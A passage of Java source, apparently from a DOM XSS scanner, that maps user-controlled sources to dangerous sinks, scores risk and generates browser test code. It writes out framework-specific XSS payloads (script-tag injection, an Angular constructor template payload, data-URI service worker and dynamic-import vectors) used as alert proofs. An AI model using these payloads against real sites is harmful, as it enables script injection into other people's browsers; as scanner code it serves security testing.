        code.append("    console.log('[DOM XSS] Starting comprehensive exploitation...');\n");
        code.append("    console.log('[DOM XSS] Detected ").append(result.getDataFlows().size()).append(" data flows');\n");
        code.append("    console.log('[DOM XSS] Detected ").append(result.getDetectedSources().size()).append(" sources');\n");
        code.append("    console.log('[DOM XSS] Detected ").append(result.getDetectedSinks().size()).append(" sinks');\n\n");
        
        // Generate context-specific test code for each data flow
        int flowIndex = 0;
        for (DataFlow flow : result.getDataFlows()) {
            code.append("    // ===== Data Flow ").append(flowIndex + 1).append(": ").append(flow.getSource().getName()).append(" -> ").append(flow.getSink().getName()).append(" =====\n");
            code.append("    (function() {\n");
            code.append("        console.log('[TEST ").append(flowIndex + 1).append("] Testing ").append(flow.getSource().getName()).append(" -> ").append(flow.getSink().getName()).append("');\n");
            code.append("        try {\n");
            code.append("            ").append(generateTestCode(flow)).append("\n");
            code.append("            console.log('[SUCCESS ").append(flowIndex + 1).append("] Payload executed successfully');\n");
            code.append("        } catch (e) {\n");
            code.append("            console.log('[ERROR ").append(flowIndex + 1).append("] Failed:', e.message);\n");
            code.append("        }\n");
            code.append("    })();\n\n");
            flowIndex++;
        }
        
        // Add real-time dynamic exploitation
        RealTimeDynamicAnalysis realTimeAnalysis = result.getRealTimeAnalysis();
        if (realTimeAnalysis != null && realTimeAnalysis.hasRealTimeVectors()) {
            code.append("    // ===== Real-Time Dynamic Exploitation =====\n");
            
            if (realTimeAnalysis.isHasMutationObserver()) {
                code.append("    console.log('[REALTIME] Testing MutationObserver exploitation...');\n");
                code.append("    try {\n");
                code.append("        const mo = new MutationObserver((mutations) => {\n");
                code.append("            mutations.forEach((m) => {\n");
                code.append("                m.addedNodes.forEach((node) => {\n");
                code.append("                    if (node.nodeType === 1 && node.innerHTML) eval(node.innerHTML);\n");
                code.append("                });\n");
                code.append("            });\n");
                code.append("        });\n");
                code.append("        mo.observe(document.body, { childList: true, subtree: true });\n");
                code.append("        document.body.innerHTML += '<script>alert(\"MutationObserver XSS\")</script>';\n");
                code.append("        console.log('[REALTIME] MutationObserver exploit executed');\n");
                code.append("    } catch (e) { console.log('[REALTIME] MutationObserver failed:', e.message); }\n\n");
            }
            
            if (realTimeAnalysis.isHasWebSocket()) {
                code.append("    console.log('[REALTIME] Testing WebSocket exploitation...');\n");
                code.append("    try {\n");
                code.append("        const ws = new WebSocket('ws://' + window.location.host + '/ws');\n");
                code.append("        ws.onopen = () => ws.send('<script>alert(\"WebSocket XSS\")</script>');\n");
                code.append("        ws.onmessage = (e) => { document.body.innerHTML += e.data; };\n");
                code.append("        console.log('[REALTIME] WebSocket exploit executed');\n");
                code.append("    } catch (e) { console.log('[REALTIME] WebSocket failed:', e.message); }\n\n");
            }
            
            if (realTimeAnalysis.isHasServiceWorker()) {
                code.append("    console.log('[REALTIME] Testing ServiceWorker exploitation...');\n");
                code.append("    try {\n");
                code.append("        navigator.serviceWorker.register('data:application/javascript,' + encodeURIComponent(\n");
                code.append("            'self.addEventListener(\"fetch\", e => e.respondWith(new Response(\"<script>alert(\\\"SW XSS\\\")</script>\")))'\n");
                code.append("        )).then(() => console.log('[REALTIME] ServiceWorker exploit executed'));\n");
                code.append("    } catch (e) { console.log('[REALTIME] ServiceWorker failed:', e.message); }\n\n");
            }
            
            if (realTimeAnalysis.isHasDynamicImport()) {
                code.append("    console.log('[REALTIME] Testing Dynamic Import exploitation...');\n");
                code.append("    try {\n");
                code.append("        import('data:text/javascript,alert(\"Dynamic Import XSS\")').then(() => \n");
                code.append("            console.log('[REALTIME] Dynamic Import exploit executed')\n");
                code.append("        );\n");
                code.append("    } catch (e) { console.log('[REALTIME] Dynamic Import failed:', e.message); }\n\n");
            }
        }
        
        code.append("    console.log('[DOM XSS] Comprehensive exploitation completed');\n");
        code.append("    console.log('[DOM XSS] Check browser console and page for XSS execution');\n");
        code.append("}\n\n");
        
        code.append("// Execute comprehensive test\n");
        code.append("testDOMXSS();\n\n");
        
        // Generate context-specific individual payload tests
        code.append("// Context-Specific Individual Payload Tests\n");
        
        int payloadNumber = 1;
        for (String payload : result.getSpecificPayloads()) {
            code.append("// Payload ").append(payloadNumber++).append("\n");
            code.append("// ").append(payload).append("\n");
            code.append("try {\n");
            code.append("    ").append(payload).append("\n");
            code.append("    console.log('[SUCCESS] Payload ").append(payloadNumber - 1).append(" executed');\n");
            code.append("} catch (e) {\n");
            code.append("    console.log('[ERROR] Payload ").append(payloadNumber - 1).append(" failed:', e.message);\n");
            code.append("}\n\n");
        }
        
        return code.toString();
    }
    
    // Helper methods
    private String extractContext(String html, int position, int windowSize) {
        int start = Math.max(0, position - windowSize / 2);
        int end = Math.min(html.length(), position + windowSize / 2);
        return html.substring(start, end).replace("\n", " ").replace("\r", " ");
    }
    
    /**
     * Escape HTML content for safe display
     */
    private String escapeHtml(String text) {
        if (text == null) return "";
        return text.replace("&", "&amp;")
                  .replace("<", "&lt;")
                  .replace(">", "&gt;")
                  .replace("\"", "&quot;")
                  .replace("'", "&#x27;");
    }
    
    private String calculateSourceRisk(String source) {
        if (source.contains("location") || source.contains("document.referrer")) return "HIGH";
        if (source.contains("cookie") || source.contains("localStorage")) return "MEDIUM";
        return "LOW";
    }
    
    private String calculateSinkRisk(String sink) {
        if (sink.contains("eval") || sink.contains("innerHTML") || sink.contains("document.write")) return "HIGH";
        if (sink.contains("setTimeout") || sink.contains("setInterval")) return "MEDIUM";
        return "LOW";
    }
    
    private boolean isPotentialDataFlow(DOMSource source, DOMSink sink, String html) {
        // ENHANCED: Advanced data flow detection for SPAs and modern web apps
        // Detects both direct and indirect flows (through state management, props, context)
        
        // Extract larger context for SPA detection (increased from 500 to 2000 chars)
        String sourceContext = extractContext(html, source.getPosition(), 2000);
        String sinkContext = extractContext(html, sink.getPosition(), 2000);
        
        String sourceName = source.getName().toLowerCase();
        String sinkName = sink.getName().toLowerCase();
        
        // Extract variable/identifier from source
        String sourceVar = extractSourceVariable(sourceName);
        String sourceBase = extractSourceBase(sourceName); // e.g., "location" from "location.hash"
        
        // Check if source is user-controlled (critical for SPA detection)
        boolean isUserControlled = sourceName.contains("location.hash") ||
                                sourceName.contains("location.search") ||
                                sourceName.contains("location.href") ||
                                sourceName.contains("document.referrer") ||
                                sourceName.contains("window.name") ||
                                sourceName.contains("urlsearchparams") ||
                                sourceName.contains("history.state") ||
                                sourceName.contains("localstorage") ||
                                sourceName.contains("sessionstorage") ||
                                sourceName.contains("postmessage") ||
                                sourceName.contains("event.data") ||
                                sourceName.contains("message.data");
        
        // Check if sink is dangerous
        boolean isDangerousSink = sinkName.contains("eval") || 
                                sinkName.contains("innerhtml") || 
                                sinkName.contains("outerhtml") ||
                                sinkName.contains("document.write") ||
                                sinkName.contains("insertadjacenthtml") ||
                                sinkName.contains("dangerouslysetinnerhtml") ||
                                sinkName.contains("v-html") ||
                                sinkName.contains("ng-bind-html") ||
                                (sinkName.contains("function") && (sinkContext.contains("eval") || sinkContext.contains("Function")));
        
        if (!isDangerousSink) {
            return false; // Not a dangerous sink
        }
        
        // ENHANCED: Check for direct data flow
        String combinedContext = sourceContext + " " + sinkContext;
        boolean hasDirectFlow = false;
        
        if (sourceVar != null && !sourceVar.isEmpty()) {
            // Pattern 1: Direct assignment: var x = source; sink(x)
            if (combinedContext.contains(sourceVar) && 
                (sinkContext.contains(sourceVar) || sinkContext.contains("=" + sourceVar) || 
                 sinkContext.contains("(" + sourceVar) || sinkContext.contains(sourceVar + ")"))) {
                hasDirectFlow = true;
            }
            
            // Pattern 2: Direct property access: sink(source.property)
            if (sourceBase != null && !sourceBase.isEmpty()) {
                if (sinkContext.contains(sourceBase + "." + sourceVar) || 
                    sinkContext.contains(sourceBase + "[")) {
                    hasDirectFlow = true;
                }
            }
        }
        
        // ENHANCED: Check for indirect flows in SPAs (state management, props, context)
        boolean hasIndirectFlow = false;
        if (isUserControlled) {
            // Pattern 3: State management flow (Redux, Vuex, MobX, Zustand)
            if (combinedContext.contains("state") && combinedContext.contains("dispatch") ||
                combinedContext.contains("store") && combinedContext.contains("commit") ||
                combinedContext.contains("setstate") || combinedContext.contains("set(") ||
                combinedContext.contains("usestate") || combinedContext.contains("usereducer")) {
                // Check if source is used in state management context
                if (sourceContext.contains("state") || sourceContext.contains("dispatch") || 
                    sourceContext.contains("commit") || sourceContext.contains("setstate")) {
                    hasIndirectFlow = true;
                }
            }
            
            // Pattern 4: Props/Context flow (React, Vue, Angular)
            if (combinedContext.contains("props") || combinedContext.contains("context") ||
                combinedContext.contains("$props") || combinedContext.contains("$attrs") ||
                combinedContext.contains("this.") && (combinedContext.contains("props") || combinedContext.contains("state"))) {
                // Check if source flows through props/context
                if (sourceContext.contains("props") || sourceContext.contains("context") ||
                    sourceContext.contains("$props") || sourceContext.contains("$attrs")) {
                    hasIndirectFlow = true;
                }
            }
            
            // Pattern 5: Router parameter flow (React Router, Vue Router, Angular Router)
            if (combinedContext.contains("router") || combinedContext.contains("route") ||
                combinedContext.contains("params") || combinedContext.contains("query") ||
                combinedContext.contains("match") || combinedContext.contains("$route")) {
                // Check if source is from router
                if (sourceName.contains("location") || sourceName.contains("history") ||
                    sourceContext.contains("router") || sourceContext.contains("route")) {
                    hasIndirectFlow = true;
                }
            }
            
            // Pattern 6: Event handler flow (onClick, onMessage, etc.)
            if (combinedContext.contains("onclick") || combinedContext.contains("onmessage") ||
                combinedContext.contains("addeventlistener") || combinedContext.contains("onevent")) {
                if (sourceContext.contains("event") || sourceContext.contains("message") ||
                    sourceName.contains("event.data") || sourceName.contains("message.data")) {
                    hasIndirectFlow = true;
                }
            }
        }
        
        // ENHANCED: For user-controlled sources, accept both direct and indirect flows
        if (isUserControlled && (hasDirectFlow || hasIndirectFlow)) {
            return true;
        }
        
        // For non-user-controlled sources, require direct flow only
        if (!isUserControlled && hasDirectFlow) {
            // Additional validation for document.cookie
            if (sourceName.contains("cookie") && !sinkContext.contains("cookie") && 
                !sinkContext.contains("split") && !sinkContext.contains("indexOf")) {
                return false; // Likely false positive
            }
            return true;
        }
        
        return false;
    }
    
    /**
     * Extract base identifier from source name (e.g., "location" from "location.hash")
     */
    private String extractSourceBase(String sourceName) {
        if (sourceName == null || sourceName.isEmpty()) return null;
        
        if (sourceName.contains(".")) {
            String[] parts = sourceName.split("\\.");
            if (parts.length > 0) {
                return parts[0].trim();
            }
        }
        
        return sourceName.trim();
    }
    
    /**
     * Extract variable/identifier from source name
     */
    private String extractSourceVariable(String sourceName) {
        if (sourceName == null || sourceName.isEmpty()) return null;
        
        // Extract the last part after dot (e.g., "document.cookie" -> "cookie")
        if (sourceName.contains(".")) {
            String[] parts = sourceName.split("\\.");
            if (parts.length > 0) {
                return parts[parts.length - 1].trim();
            }
        }
        
        // If no dot, return the source name itself
        return sourceName.trim();
    }
    
    private String calculateFlowRisk(DOMSource source, DOMSink sink) {
        if (source.getRiskLevel().equals("HIGH") && sink.getRiskLevel().equals("HIGH")) return "CRITICAL";
        if (source.getRiskLevel().equals("HIGH") || sink.getRiskLevel().equals("HIGH")) return "HIGH";
        if (source.getRiskLevel().equals("MEDIUM") || sink.getRiskLevel().equals("MEDIUM")) return "MEDIUM";
        return "LOW";
    }
    
    private String generateFlowPayload(DOMSource source, DOMSink sink) {
        if (source.getName().contains("location.hash")) {
            return "#<script>alert('DOM_XSS')</script>";
        } else if (source.getName().contains("location.search")) {
            return "?param=<script>alert('DOM_XSS')</script>";
        } else if (source.getName().contains("document.referrer")) {
            return "<script>alert('DOM_XSS')</script>";
        }
        return "<script>alert('DOM_XSS')</script>";
    }
    
    private int calculateVulnerabilityScore(List<DOMSource> sources, List<DOMSink> sinks, List<DataFlow> flows, RealTimeDynamicAnalysis realTimeAnalysis) {
        int score = 0;
        
        // Base score from sources and sinks
        score += sources.size() * 5;
        score += sinks.size() * 10;
        
        // Bonus for high-risk items
        for (DOMSource source : sources) {
            if (source.getRiskLevel().equals("HIGH")) score += 15;
            else if (source.getRiskLevel().equals("MEDIUM")) score += 10;
        }
        
        for (DOMSink sink : sinks) {
            if (sink.getRiskLevel().equals("HIGH")) score += 20;
            else if (sink.getRiskLevel().equals("MEDIUM")) score += 15;
        }
        
        // Bonus for data flows
        score += flows.size() * 25;
        
        // Bonus for real-time vectors
        if (realTimeAnalysis.hasRealTimeVectors()) {
            score += 50; // Significant bonus for any real-time vector
        }
        
        return Math.min(score, 100);
    }
    
    private String calculateConfidenceLevel(int score) {
        if (score >= 80) return "Certain";
        if (score >= 60) return "Firm";
        return "Tentative";
    }
    
    private String calculateRiskLevel(int score) {
        if (score >= 80) return "Critical";
        if (score >= 60) return "High";
        if (score >= 40) return "Medium";
        return "Low";
    }
    
    private List<String> generateSpecificPayloads(List<DOMSource> sources, List<DOMSink> sinks, List<String> frameworks) {
        List<String> payloads = new ArrayList<>();
        
        // Add basic DOM XSS payloads
        payloads.addAll(Arrays.asList(DOM_XSS_PAYLOADS));
        
        // Add framework-specific payloads
        for (String framework : frameworks) {
            payloads.addAll(generateFrameworkPayloads(framework));
        }
        
        // Add source-specific payloads
        for (DOMSource source : sources) {
            payloads.addAll(generateSourceSpecificPayloads(source));
        }
        
        return payloads;
    }
    
    private List<String> generateFrameworkPayloads(String framework) {
        List<String> payloads = new ArrayList<>();
        
        switch (framework.toLowerCase()) {
            case "react":
                payloads.add("ReactDOM.render('<script>alert(1)</script>', document.body)");
                payloads.add("dangerouslySetInnerHTML={{__html: '<script>alert(1)</script>'}}");
                break;
            case "vue":
                payloads.add("v-html=\"'<script>alert(1)</script>'\"");
                payloads.add("Vue.set(this, 'html', '<script>alert(1)</script>')");
                break;
            case "angular":
                payloads.add("ng-bind-html=\"'<script>alert(1)</script>'\"");
                payloads.add("{{constructor.constructor('alert(1)')()}}");
                break;
            case "jquery":
                payloads.add("$('#element').html('<script>alert(1)</script>')");
                payloads.add("jQuery('#element').append('<script>alert(1)</script>')");
                break;
        }
        
        return payloads;
    }
    
    private List<String> generateSourceSpecificPayloads(DOMSource source) {
        List<String> payloads = new ArrayList<>();
        
        if (source.getName().contains("location.hash")) {
            payloads.add("location.hash = '<script>alert(1)</script>'");
            payloads.add("location.hash = 'javascript:alert(1)'");
        } else if (source.getName().contains("location.search")) {
            payloads.add("location.search = '?param=<script>alert(1)</script>'");
        } else if (source.getName().contains("document.referrer")) {
            payloads.add("document.referrer = '<script>alert(1)</script>'");
        }
        
        return payloads;
    }
    
    private String generateFrameworkExploit(String framework, String targetUrl) {
        switch (framework.toLowerCase()) {
            case "react":
                return "ReactDOM.render('<script>alert(1)</script>', document.body)";
            case "vue":
                return "v-html=\"'<script>alert(1)</script>'\"";
            case "angular":
                return "{{constructor.constructor('alert(1)')()}}";
            case "jquery":
                return "$('#element').html('<script>alert(1)</script>')";
            default:
                return "<script>alert(1)</script>";
        }
    }
    
    private String generateTestCode(DataFlow flow) {
        if (flow.getSource().getName().contains("location.hash")) {
            return "location.hash = '" + flow.getExploitPayload() + "';";
        } else if (flow.getSource().getName().contains("location.search")) {
            return "location.search = '?param=" + flow.getExploitPayload() + "';";
        } else {
            return "// Manual test required for " + flow.getSource().getName() + " -> " + flow.getSink().getName();
        }
    }
    
    // Data classes
    public static class DOMXSSResult {
        private List<DOMSource> detectedSources = new ArrayList<>();
        private List<DOMSink> detectedSinks = new ArrayList<>();
        private List<String> detectedFrameworks = new ArrayList<>();
        private List<DataFlow> dataFlows = new ArrayList<>();
        private List<String> specificPayloads = new ArrayList<>();
        private int vulnerabilityScore = 0;
        private boolean vulnerable = false;
        private String confidenceLevel = "Tentative";
        private String riskLevel = "Low";
        private String exploitPOC = "";
        private String reproductionSteps = "";
        private String sourceSinkAnalysis = "";
        private String browserExploitCode = "";
        private RealTimeDynamicAnalysis realTimeAnalysis = new RealTimeDynamicAnalysis();
        
        // CRITICAL FIX: Add TEST_REQUEST and TEST_RESPONSE for real exploited evidence
        private String testRequest = "";
        private String testResponse = "";
        private String testPayload = "";
        
        // Getters and setters
        public List<DOMSource> getDetectedSources() { return detectedSources; }
        public void setDetectedSources(List<DOMSource> detectedSources) { this.detectedSources = detectedSources; }
        
        public List<DOMSink> getDetectedSinks() { return detectedSinks; }
        public void setDetectedSinks(List<DOMSink> detectedSinks) { this.detectedSinks = detectedSinks; }
        
        public List<String> getDetectedFrameworks() { return detectedFrameworks; }
        public void setDetectedFrameworks(List<String> detectedFrameworks) { this.detectedFrameworks = detectedFrameworks; }
        
        public List<DataFlow> getDataFlows() { return dataFlows; }
        public void setDataFlows(List<DataFlow> dataFlows) { this.dataFlows = dataFlows; }
        
        public List<String> getSpecificPayloads() { return specificPayloads; }
        public void setSpecificPayloads(List<String> specificPayloads) { this.specificPayloads = specificPayloads; }
        
        public int getVulnerabilityScore() { return vulnerabilityScore; }
        public void setVulnerabilityScore(int vulnerabilityScore) { this.vulnerabilityScore = vulnerabilityScore; }
        
        public boolean isVulnerable() { return vulnerable; }
        public void setVulnerable(boolean vulnerable) { this.vulnerable = vulnerable; }
        
        public String getConfidenceLevel() { return confidenceLevel; }
        public void setConfidenceLevel(String confidenceLevel) { this.confidenceLevel = confidenceLevel; }
        
        public String getRiskLevel() { return riskLevel; }
        public void setRiskLevel(String riskLevel) { this.riskLevel = riskLevel; }
        
        public String getExploitPOC() { return exploitPOC; }
        public void setExploitPOC(String exploitPOC) { this.exploitPOC = exploitPOC; }
        
        public String getReproductionSteps() { return reproductionSteps; }
        public void setReproductionSteps(String reproductionSteps) { this.reproductionSteps = reproductionSteps; }
        
        public String getSourceSinkAnalysis() { return sourceSinkAnalysis; }
        public void setSourceSinkAnalysis(String sourceSinkAnalysis) { this.sourceSinkAnalysis = sourceSinkAnalysis; }
        
        public String getBrowserExploitCode() { return browserExploitCode; }
        public void setBrowserExploitCode(String browserExploitCode) { this.browserExploitCode = browserExploitCode; }
        
        public RealTimeDynamicAnalysis getRealTimeAnalysis() { return realTimeAnalysis; }
        public void setRealTimeAnalysis(RealTimeDynamicAnalysis realTimeAnalysis) { this.realTimeAnalysis = realTimeAnalysis; }
        
        // CRITICAL FIX: Getters and setters for real exploited evidence
        public String getTestRequest() { return testRequest; }
        public void setTestRequest(String testRequest) { this.testRequest = testRequest; }
        
        public String getTestResponse() { return testResponse; }
        public void setTestResponse(String testResponse) { this.testResponse = testResponse; }
        
        public String getTestPayload() { return testPayload; }
        public void setTestPayload(String testPayload) { this.testPayload = testPayload; }
    }
    
    public static class DOMSource {
        private String name;
        private int position;
        private String context;
        private String riskLevel;
        
        // Getters and setters
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        
        public int getPosition() { return position; }
        public void setPosition(int position) { this.position = position; }
        
        public String getContext() { return context; }
        public void setContext(String context) { this.context = context; }
        
        public String getRiskLevel() { return riskLevel; }
        public void setRiskLevel(String riskLevel) { this.riskLevel = riskLevel; }
    }
    
    public static class DOMSink {
        private String name;
        private int position;
        private String context;
        private String riskLevel;
        
        // Getters and setters
        public String getName() { return name; }
        public void setName(String name) { this.name = name; }
        
        public int getPosition() { return position; }
        public void setPosition(int position) { this.position = position; }
        
        public String getContext() { return context; }
        public void setContext(String context) { this.context = context; }
        
        public String getRiskLevel() { return riskLevel; }
        public void setRiskLevel(String riskLevel) { this.riskLevel = riskLevel; }
    }
    
    public static class DataFlow {
        private DOMSource source;
        private DOMSink sink;
        private String riskLevel;
        private String exploitPayload;
        
        // Getters and setters
        public DOMSource getSource() { return source; }
        public void setSource(DOMSource source) { this.source = source; }
        
        public DOMSink getSink() { return sink; }
        public void setSink(DOMSink sink) { this.sink = sink; }
        
        public String getRiskLevel() { return riskLevel; }
        public void setRiskLevel(String riskLevel) { this.riskLevel = riskLevel; }
        
        public String getExploitPayload() { return exploitPayload; }
        public void setExploitPayload(String exploitPayload) { this.exploitPayload = exploitPayload; }
    }

    public static class RealTimeDynamicAnalysis {
        private boolean hasMutationObserver = false;
        private String mutationObserverRisk = "LOW";
        private boolean hasWebSocket = false;
        private String webSocketRisk = "LOW";
        private boolean hasEventSource = false;
        private String eventSourceRisk = "LOW";
        private boolean hasServiceWorker = false;
        private String serviceWorkerRisk = "LOW";
        private boolean hasWebWorker = false;
        private String webWorkerRisk = "LOW";
        private boolean hasBroadcastChannel = false;
        private String broadcastChannelRisk = "LOW";
        private boolean hasDynamicImport = false;
        private String dynamicImportRisk = "LOW";
        private boolean hasSharedArrayBuffer = false;
        private String sharedArrayBufferRisk = "LOW";
        private boolean hasWebAssembly = false;
        private String webAssemblyRisk = "LOW";
        private boolean hasRequestAnimationFrame = false;
        private String requestAnimationFrameRisk = "LOW";
        private boolean hasPromiseAsync = false;
        private String promiseAsyncRisk = "LOW";
        private boolean hasProxy = false;
        private String proxyRisk = "LOW";
        private boolean hasReflectAPI = false;
        private String reflectAPIRisk = "LOW";
        private boolean hasObserverAPI = false;
        private String observerAPIRisk = "LOW";
        private int realTimeRiskScore = 0;
        private List<String> realTimeVectors = new ArrayList<>();

        // Getters and setters
        public boolean isHasMutationObserver() { return hasMutationObserver; }
        public void setHasMutationObserver(boolean hasMutationObserver) { this.hasMutationObserver = hasMutationObserver; }
        public String getMutationObserverRisk() { return mutationObserverRisk; }
        public void setMutationObserverRisk(String mutationObserverRisk) { this.mutationObserverRisk = mutationObserverRisk; }
        public boolean isHasWebSocket() { return hasWebSocket; }
        public void setHasWebSocket(boolean hasWebSocket) { this.hasWebSocket = hasWebSocket; }
        public String getWebSocketRisk() { return webSocketRisk; }
        public void setWebSocketRisk(String webSocketRisk) { this.webSocketRisk = webSocketRisk; }
        public boolean isHasEventSource() { return hasEventSource; }
        public void setHasEventSource(boolean hasEventSource) { this.hasEventSource = hasEventSource; }
        public String getEventSourceRisk() { return eventSourceRisk; }
        public void setEventSourceRisk(String eventSourceRisk) { this.eventSourceRisk = eventSourceRisk; }
        public boolean isHasServiceWorker() { return hasServiceWorker; }
        public void setHasServiceWorker(boolean hasServiceWorker) { this.hasServiceWorker = hasServiceWorker; }
        public String getServiceWorkerRisk() { return serviceWorkerRisk; }
        public void setServiceWorkerRisk(String serviceWorkerRisk) { this.serviceWorkerRisk = serviceWorkerRisk; }
        public boolean isHasWebWorker() { return hasWebWorker; }
        public void setHasWebWorker(boolean hasWebWorker) { this.hasWebWorker = hasWebWorker; }
        public String getWebWorkerRisk() { return webWorkerRisk; }
        public void setWebWorkerRisk(String webWorkerRisk) { this.webWorkerRisk = webWorkerRisk; }
        public boolean isHasBroadcastChannel() { return hasBroadcastChannel; }
        public void setHasBroadcastChannel(boolean hasBroadcastChannel) { this.hasBroadcastChannel = hasBroadcastChannel; }
        public String getBroadcastChannelRisk() { return broadcastChannelRisk; }
        public void setBroadcastChannelRisk(String broadcastChannelRisk) { this.broadcastChannelRisk = broadcastChannelRisk; }
        public boolean isHasDynamicImport() { return hasDynamicImport; }
        public void setHasDynamicImport(boolean hasDynamicImport) { this.hasDynamicImport = hasDynamicImport; }
        public String getDynamicImportRisk() { return dynamicImportRisk; }
        public void setDynamicImportRisk(String dynamicImportRisk) { this.dynamicImportRisk = dynamicImportRisk; }
        public boolean isHasSharedArrayBuffer() { return hasSharedArrayBuffer; }
        public void setHasSharedArrayBuffer(boolean hasSharedArrayBuffer) { this.hasSharedArrayBuffer = hasSharedArrayBuffer; }
        public String getSharedArrayBufferRisk() { return sharedArrayBufferRisk; }
        public void setSharedArrayBufferRisk(String sharedArrayBufferRisk) { this.sharedArrayBufferRisk = sharedArrayBufferRisk; }
        public boolean isHasWebAssembly() { return hasWebAssembly; }
        public void setHasWebAssembly(boolean hasWebAssembly) { this.hasWebAssembly = hasWebAssembly; }
        public String getWebAssemblyRisk() { return webAssemblyRisk; }
        public void setWebAssemblyRisk(String webAssemblyRisk) { this.webAssemblyRisk = webAssemblyRisk; }
        public boolean isHasRequestAnimationFrame() { return hasRequestAnimationFrame; }
        public void setHasRequestAnimationFrame(boolean hasRequestAnimationFrame) { this.hasRequestAnimationFrame = hasRequestAnimationFrame; }
        public String getRequestAnimationFrameRisk() { return requestAnimationFrameRisk; }
        public void setRequestAnimationFrameRisk(String requestAnimationFrameRisk) { this.requestAnimationFrameRisk = requestAnimationFrameRisk; }
        public boolean isHasPromiseAsync() { return hasPromiseAsync; }
        public void setHasPromiseAsync(boolean hasPromiseAsync) { this.hasPromiseAsync = hasPromiseAsync; }
        public String getPromiseAsyncRisk() { return promiseAsyncRisk; }
        public void setPromiseAsyncRisk(String promiseAsyncRisk) { this.promiseAsyncRisk = promiseAsyncRisk; }
        public boolean isHasProxy() { return hasProxy; }
        public void setHasProxy(boolean hasProxy) { this.hasProxy = hasProxy; }
        public String getProxyRisk() { return proxyRisk; }
        public void setProxyRisk(String proxyRisk) { this.proxyRisk = proxyRisk; }
        public boolean isHasReflectAPI() { return hasReflectAPI; }
        public void setHasReflectAPI(boolean hasReflectAPI) { this.hasReflectAPI = hasReflectAPI; }
        public String getReflectAPIRisk() { return reflectAPIRisk; }
        public void setReflectAPIRisk(String reflectAPIRisk) { this.reflectAPIRisk = reflectAPIRisk; }
        public boolean isHasObserverAPI() { return hasObserverAPI; }
        public void setHasObserverAPI(boolean hasObserverAPI) { this.hasObserverAPI = hasObserverAPI; }
        public String getObserverAPIRisk() { return observerAPIRisk; }
        public void setObserverAPIRisk(String observerAPIRisk) { this.observerAPIRisk = observerAPIRisk; }
                 public int getRealTimeRiskScore() { return realTimeRiskScore; }
         public void setRealTimeRiskScore(int realTimeRiskScore) { this.realTimeRiskScore = realTimeRiskScore; }
         public List<String> getRealTimeVectors() { return realTimeVectors; }
         public void setRealTimeVectors(List<String> realTimeVectors) { this.realTimeVectors = realTimeVectors; }
         
         public boolean hasRealTimeVectors() { return !realTimeVectors.isEmpty(); }
    }
} 